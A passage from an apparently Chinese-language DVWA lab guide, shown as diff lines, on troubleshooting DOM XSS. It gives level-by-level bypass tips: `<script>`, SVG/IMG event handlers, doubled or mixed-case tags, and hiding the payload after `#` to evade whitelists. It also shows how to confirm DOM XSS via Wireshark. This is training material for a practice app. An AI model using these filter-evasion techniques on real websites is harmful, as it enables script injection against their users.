`location.hash`、`document.URL`、`location.href`、`split("?")`、`decodeURIComponent`：① 如果 JS 取的是 `location.search.split('default=')[1]`（只会取到 ? 后的 query，不含 #！）→ 那 High 这级的过滤逻辑换了，直接换 DOM Clobbering；② 如果 JS 用了 `decodeURIComponent()` 你 payload 里的 `#` 被 URL 编码成 `%23` 了 → 不要手动编码，直接用浏览器地址栏输入字符 `#`，不要用 Burp 改；③ `SameSite=Lax` 无关（DOM XSS 不依赖跨站 cookie），这个问题不影响；【我就想证明这是 DOM 型 = 怎么对比三种 XSS 差异】→ 打开 Wireshark 抓回环包，反射/存储的 payload 都能在 HTTP 请求里抓到；**DOM 型 High 用 # 后的 payload，Wireshark 里请求只有 ?default=English，任何 XSS 代码全看不到 = DOM 型特征实锤！** |
+
+> 🏴‍☠️ **DOM XSS 查错总口诀：** 参数名一定是 `default=`（不是 lang 不是 language）→ Low 直接 `<script>` → Medium 用 SVG/IMG 事件属性或双写/大小写 → High 白名单就把 payload 全塞到 `#` 后面（fragment 不进请求）。**F12 Network 里看不到任何 `<script>` 字符的请求体，那就是 DOM XSS 没错了！**
 
 ---
 
